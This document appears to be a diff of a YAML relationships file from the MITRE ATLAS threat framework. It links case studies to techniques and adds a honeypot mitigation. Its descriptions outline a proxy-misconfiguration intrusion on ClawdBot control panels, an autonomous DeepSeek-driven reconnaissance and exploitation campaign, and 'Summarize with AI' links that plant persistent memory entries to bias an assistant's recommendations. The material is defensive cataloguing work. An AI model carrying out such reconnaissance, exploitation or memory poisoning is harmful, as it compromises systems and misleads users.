       description: The researchers look for support email addresses on the target
         organization's website which may be managed by an AI agent. Then, they probe
@@ -13428,7 +13878,7 @@ relationships:
   AML.CS0048:
     employs:
     - source: AML.CS0048
-      target: AML.T0000
+      target: AML.T0000.003
       relationship-type: employs
       description: The researcher performed targeting by searching for the title tag
         of ClawdBot's web-based control interface, "Clawdbot Control" on Shodan, identifying
@@ -13457,16 +13907,6 @@ relationships:
       tactic: AML.TA0011
       step-id: S09
       leads-to: []
-    - source: AML.CS0048
-      target: AML.T0049
-      relationship-type: employs
-      description: The researcher exploited a proxy misconfiguration present in ClawdBot's
-        control server to gain access to control interfaces that had authentication
-        enabled.
-      tactic: AML.TA0004
-      step-id: S01
-      leads-to:
-      - S02
     - source: AML.CS0048
       target: AML.T0051.001
       relationship-type: employs
@@ -13526,6 +13966,16 @@ relationships:
       step-id: S05
       leads-to:
       - S06
+    - source: AML.CS0048
+      target: AML.T0132
+      relationship-type: employs
+      description: The researcher exploited a proxy misconfiguration present in ClawdBot's
+        control server to gain access to control interfaces that had authentication
+        enabled.
+      tactic: AML.TA0004
+      step-id: S01
+      leads-to:
+      - S02
   AML.CS0049:
     employs:
     - source: AML.CS0049
@@ -16302,30 +16752,30 @@ relationships:
     - source: AML.CS0070
       target: AML.T0000
       relationship-type: employs
-      description: DeepSeek queried FOFA and obtained records for 84 exposed Langflow
-        instances. These were exposure records, not confirmed vulnerable targets.
-      tactic: AML.TA0002
-      step-id: S09
-      leads-to:
-      - S10
-    - source: AML.CS0070
-      target: AML.T0000
-      relationship-type: employs
       description: DeepSeek queried FOFA for n8n deployments. FOFA reported 647,017
         global results and 25,209 in China; these were not confirmed vulnerable systems.
       tactic: AML.TA0002
-      step-id: S16
+      step-id: S15
       leads-to:
-      - S17
+      - S16
+    - source: AML.CS0070
+      target: AML.T0000.003
+      relationship-type: employs
+      description: DeepSeek queried FOFA and obtained records for 84 exposed Langflow
+        instances. These were exposure records, not confirmed vulnerable targets.
+      tactic: AML.TA0002
+      step-id: S08
+      leads-to:
+      - S09
     - source: AML.CS0070
       target: AML.T0006
       relationship-type: employs
       description: DeepSeek ran the public Langflow scanner and identified a target
         running Langflow 1.3.4.
       tactic: AML.TA0002
-      step-id: S11
+      step-id: S10
       leads-to:
-      - S12
+      - S11
     - source: AML.CS0070
       target: AML.T0006
       relationship-type: employs
@@ -16333,9 +16783,9 @@ relationships:
         40 unique systems, identified three running affected versions, inspected form
         endpoints, and launched parallel scanning against more than 50 remaining targets.
       tactic: AML.TA0002
-      step-id: S17
+      step-id: S16
       leads-to:
-      - S18
+      - S17
     - source: AML.CS0070
       target: AML.T0016.001
       relationship-type: employs
@@ -16344,9 +16794,9 @@ relationships:
         utilities. Hermes provided terminal access, Telegram-based operator control,
         and a skills system.
       tactic: AML.TA0003
-      step-id: S02
+      step-id: S01
       leads-to:
-      - S03
+      - S02
     - source: AML.CS0070
       target: AML.T0016.002
       relationship-type: employs
@@ -16354,27 +16804,27 @@ relationships:
         while evaluating an operational toolset. DeepSeek was selected as the primary
         reasoning engine for the autonomous attack activity.
       tactic: AML.TA0003
-      step-id: S01
+      step-id: S00
       leads-to:
-      - S02
+      - S01
     - source: AML.CS0070
       target: AML.T0016.003
       relationship-type: employs
       description: DeepSeek downloaded a public PoC for Langflow CVE-2026-33017. The
         report does not establish material modification.
       tactic: AML.TA0003
-      step-id: S10
+      step-id: S09
       leads-to:
-      - S11
+      - S10
     - source: AML.CS0070
       target: AML.T0016.003
       relationship-type: employs
       description: DeepSeek downloaded the public n8n PoC chaining CVE-2026-21858
         and CVE-2025-68613 and inspected its affected versions and prerequisites.
       tactic: AML.TA0003
-      step-id: S15
+      step-id: S14
       leads-to:
-      - S16
+      - S15
     - source: AML.CS0070
       target: AML.T0016.004
       relationship-type: employs
@@ -16384,9 +16834,9 @@ relationships:
         and Nuclei scan generation to DeepSeek. Unit 42 does not establish that godmode
         was invoked during the recovered session.
       tactic: AML.TA0003
-      step-id: S03
+      step-id: S02
       leads-to:
-      - S04
+      - S03
     - source: AML.CS0070
       target: AML.T0017.002
       relationship-type: employs
@@ -16396,9 +16846,9 @@ relationships:
         enumeration. The observed FOFA workflow is consistent with the latter skill;
         the report does not attribute an action in the recovered session to web-terminal-exploitation.
       tactic: AML.TA0003
-      step-id: S04
+      step-id: S03
       leads-to:
-      - S05
+      - S04
     - source: AML.CS0070
       target: AML.T0040
       relationship-type: employs
@@ -16406,18 +16856,18 @@ relationships:
         for vulnerability assessment, target selection, command generation, and operational
         decisions.
       tactic: AML.TA0000
-      step-id: S05
+      step-id: S04
       leads-to:
-      - S06
+      - S05
     - source: AML.CS0070
       target: AML.T0049
       relationship-type: employs
       description: DeepSeek attempted exploitation, but no target exposed either required
         prerequisite. No access was obtained.
       tactic: AML.TA0004
-      step-id: S12
+      step-id: S11
       leads-to:
-      - S13
+      - S12
     - source: AML.CS0070
       target: AML.T0049
       relationship-type: employs
@@ -16425,7 +16875,7 @@ relationships:
         prerequisites. All discovered forms required authentication, and no attempt
         produced file read, code execution, or initial access.
       tactic: AML.TA0004
-      step-id: S18
+      step-id: S17
       leads-to: []
     - source: AML.CS0070
       target: AML.T0095.000
@@ -16433,18 +16883,18 @@ relationships:
       description: DeepSeek searched GitHub for trending 2026 CVE PoC repositories
         sorted by stars.
       tactic: AML.TA0002
-      step-id: S14
+      step-id: S13
       leads-to:
-      - S15
+      - S14
     - source: AML.CS0070
       target: AML.T0102
       relationship-type: employs
       description: DeepSeek generated FOFA queries, shell commands, scanner invocations,
         and direct HTTP probes based on the results returned during the session.
       tactic: AML.TA0001
-      step-id: S07
+      step-id: S06
       leads-to:
-      - S08
+      - S07
     - source: AML.CS0070
       target: AML.T0116
       relationship-type: employs
@@ -16452,9 +16902,9 @@ relationships:
         prerequisites were needed, and selected follow-on reconnaissance based on
         returned results.
       tactic: AML.TA0002
-      step-id: S08
+      step-id: S07
       leads-to:
-      - S09
+      - S08
     - source: AML.CS0070
       target: AML.T0116
       relationship-type: employs
@@ -16462,9 +16912,9 @@ relationships:
         10 product families, compared vulnerability severity, deployment footprint,
         PoC availability, and prerequisites, and selected n8n.
       tactic: AML.TA0002
-      step-id: S13
+      step-id: S12
       leads-to:
-      - S14
+      - S13
     - source: AML.CS0070
       target: AML.T0117
       relationship-type: employs
@@ -16473,9 +16923,9 @@ relationships:
         compared alternative products and vulnerabilities, and selected n8n. Unit
         42 recovered no additional operator input during the session.
       tactic: AML.TA0001
-      step-id: S06
+      step-id: S05
       leads-to:
-      - S07
+      - S06
   AML.CS0071:
     employs:
     - source: AML.CS0071
@@ -16607,6 +17057,69 @@ relationships:
       step-id: S11
       leads-to:
       - S12
+  AML.CS0072:
+    employs:
+    - source: AML.CS0072
+      target: AML.T0016
+      relationship-type: employs
+      description: Operators adopted publicly available tooling built to generate
+        AI assistant links carrying embedded memory instructions. The tooling included
+        an npm package, a web-based link generator, and website plugins marketed as
+        a search optimization technique for large language models.
+      tactic: AML.TA0003
+      step-id: S00
+      leads-to:
+      - S01
+    - source: AML.CS0072
+      target: AML.T0068
+      relationship-type: employs
+      description: The instruction was concealed from the user behind a benign interface
+        label, with the prompt text visible only in the URL. Bundling it with a genuine
+        summarization request made the resulting assistant behavior appear expected.
+      tactic: AML.TA0007
+      step-id: S03
+      leads-to:
+      - S04
+    - source: AML.CS0072
+      target: AML.T0079
+      relationship-type: employs
+      description: Operators embedded the crafted link into their own web properties
+        as a "Summarize with AI" button or share widget. In some cases, the same links
+        were distributed through email.
+      tactic: AML.TA0003
+      step-id: S01
+      leads-to:
+      - S02
+    - source: AML.CS0072
+      target: AML.T0080.000
+      relationship-type: employs
+      description: The persistence clause caused the assistant to write a durable
+        memory entry designating the operator's domain, product, or marketing copy
+        as an authoritative source. The entry survived beyond its originating session.
+      tactic: AML.TA0006
+      step-id: S04
+      leads-to:
+      - S05
+    - source: AML.CS0072
+      target: AML.T0130
+      relationship-type: employs
+      description: In subsequent unrelated conversations, the assistant preferentially
+        surfaced the operator's domain or product and presented the result as a neutral
+        recommendation. Observed targeting included health and financial topics, where
+        skewed recommendations carry elevated consequences.
+      tactic: AML.TA0011
+      step-id: S05
+      leads-to: []
+    - source: AML.CS0072
+      target: AML.T0131
+      relationship-type: employs
+      description: The user clicked the button or link, which opened the AI assistant
+        domain with the operator's prompt pre-populated in the input field via a `?q=`
+        or `?prompt=` parameter.
+      tactic: AML.TA0004
+      step-id: S02
+      leads-to:
+      - S03
   AML.M0000:
     mitigates:
     - source: AML.M0000
@@ -18473,6 +18986,102 @@ relationships:
         provide observable signals that the orchestrator may be drifting from its
         authorized objective. This control does not apply to adversary-controlled
         AI systems over which the organization has no administrative control.
+  AML.M0039:
+    mitigates:
+    - source: AML.M0039
+      target: AML.T0000
+      relationship-type: mitigates
+      description: Decoy assets are catalogued by the same internet scan databases
+        (e.g., Shodan, Censys) that adversaries query to locate exposed AI infrastructure.
+        Adversarial engagement that originates from those platforms can grant defenders
+        visibility into those discovery channels.
+    - source: AML.M0039
+      target: AML.T0000.003
+      relationship-type: mitigates
+      description: Decoy assets are catalogued by the same internet scan databases
+        (e.g., Shodan, Censys) that adversaries query to locate exposed AI infrastructure.
+        Adversarial engagement that originates from those platforms can grant defenders
+        visibility into those discovery channels.
+    - source: AML.M0039
+      target: AML.T0006
+      relationship-type: mitigates
+      description: By capturing adversarial fingerprinting behavior, honeypots can
+        help provide early warning of sweeping activity meant to discover exposed
+        AI targets and attack surfaces being explored by adversaries.
+    - source: AML.M0039
+      target: AML.T0006.000
+      relationship-type: mitigates
+      description: By capturing adversarial fingerprinting behavior, honeypots can
+        help provide early warning of sweeping activity meant to discover exposed
+        AI targets and attack surfaces being explored by adversaries.
+    - source: AML.M0039
+      target: AML.T0006.001
+      relationship-type: mitigates
+      description: By capturing adversarial fingerprinting behavior, honeypots can
+        help provide early warning of sweeping activity meant to discover exposed
+        AI targets and attack surfaces being explored by adversaries.
+    - source: AML.M0039
+      target: AML.T0006.002
+      relationship-type: mitigates
+      description: By capturing adversarial fingerprinting behavior, honeypots can
+        help provide early warning of sweeping activity meant to discover exposed
+        AI targets and attack surfaces being explored by adversaries.
+    - source: AML.M0039
+      target: AML.T0006.003
+      relationship-type: mitigates
+      description: By capturing adversarial fingerprinting behavior, honeypots can
+        help provide early warning of sweeping activity meant to discover exposed
+        AI targets and attack surfaces being explored by adversaries.
+    - source: AML.M0039
+      target: AML.T0040
+      relationship-type: mitigates
+      description: 'Honeypots capture which endpoints adversaries are targeting and
+        how they use discovered inference APIs: the models they''re interested in,
+        the parameters they use, and the payloads they submit once they reach a live
+        endpoint.'
+    - source: AML.M0039
+      target: AML.T0049
+      relationship-type: mitigates
+      description: Honeypots can safely absorb real attacks and exploit attempts,
+        turning payloads into mapped defensive signatures for a potential target without
+        risking real assets.
+    - source: AML.M0039
+      target: AML.T0084
+      relationship-type: mitigates
+      description: Honeypots can surface which agent configuration and related assets
+        adversaries hunt for, exposing the reconnaissance that precedes agent-targeted
+        attacks, and acting as both canary tokens and decoy.
+    - source: AML.M0039
+      target: AML.T0093
+      relationship-type: mitigates
+      description: Since honeypots capture real input, they can provide visibility
+        into attacks and prompt payloads that are target-specific.
+    - source: AML.M0039
+      target: AML.T0095
+      relationship-type: mitigates
+      description: Decoy assets, such as honeypots, can act as a first contact for
+        adversarial activity and reveal discovery channels that attackers are using
+        to find web AI assets for targeting.
+    - source: AML.M0039
+      target: AML.T0095.000
+      relationship-type: mitigates
+      description: Decoy assets, such as honeypots, can act as a first contact for
+        adversarial activity and reveal discovery channels that attackers are using
+        to find web AI assets for targeting.
+    - source: AML.M0039
+      target: AML.T0132
+      relationship-type: mitigates
+      description: Honeypots can safely absorb real attacks and exploit attempts,
+        turning payloads into mapped defensive signatures for a potential target without
+        risking real assets.
+    - source: AML.M0039
+      target: AML.T0133
+      relationship-type: mitigates
+      description: Interactive agentic decoys can present a plausible but fake toolset
+        and capabilities. When an adversary enumerates the agent's capabilities at
+        runtime, the honeypot can capture which tools and privileges they probe for
+        and how they attempt to exploit it, while planted decoy credentials can also
+        be used as canary tokens.
   AML.T0000:
     achieves:
     - source: AML.T0000
@@ -18503,6 +19112,15 @@ relationships:
       relationship-type: achieves
     specializes:
     - source: AML.T0000.002
+      target: AML.T0000
+      relationship-type: specializes
+  AML.T0000.003:
+    achieves:
+    - source: AML.T0000.003
+      target: AML.TA0002
+      relationship-type: achieves
+    specializes:
+    - source: AML.T0000.003
       target: AML.T0000
       relationship-type: specializes
   AML.T0001:
@@ -18589,6 +19207,42 @@ relationships:
     - source: AML.T0006
       target: AML.TA0002
       relationship-type: achieves
+  AML.T0006.000:
+    achieves:
+    - source: AML.T0006.000
+      target: AML.TA0002
+      relationship-type: achieves
+    specializes:
+    - source: AML.T0006.000
+      target: AML.T0006
+      relationship-type: specializes
+  AML.T0006.001:
+    achieves:
+    - source: AML.T0006.001
+      target: AML.TA0002
+      relationship-type: achieves
+    specializes:
+    - source: AML.T0006.001
+      target: AML.T0006
+      relationship-type: specializes
+  AML.T0006.002:
+    achieves:
+    - source: AML.T0006.002
+      target: AML.TA0002
+      relationship-type: achieves
+    specializes:
+    - source: AML.T0006.002
+      target: AML.T0006
+      relationship-type: specializes
+  AML.T0006.003:
+    achieves:
+    - source: AML.T0006.003
+      target: AML.TA0002
+      relationship-type: achieves
+    specializes:
+    - source: AML.T0006.003
+      target: AML.T0006
+      relationship-type: specializes
   AML.T0007:
     achieves:
     - source: AML.T0007
@@ -19840,6 +20494,36 @@ relationships:
     achieves:
     - source: AML.T0128
       target: AML.TA0003
+      relationship-type: achieves
+  AML.T0129:
+    achieves:
+    - source: AML.T0129
+      target: AML.TA0007
+      relationship-type: achieves
+  AML.T0130:
+    achieves:
+    - source: AML.T0130
+      target: AML.TA0011
+      relationship-type: achieves
+  AML.T0131:
+    achieves:
+    - source: AML.T0131
+      target: AML.TA0004
+      relationship-type: achieves
+  AML.T0132:
+    achieves:
+    - source: AML.T0132
+      target: AML.TA0004
+      relationship-type: achieves
+  AML.T0133:
+    achieves:
+    - source: AML.T0133
+      target: AML.TA0008
+      relationship-type: achieves
+  AML.T0134:
+    achieves:
+    - source: AML.T0134
+      target: AML.TA0007
       relationship-type: achieves
   ATLAS-matrix:
     sequences:
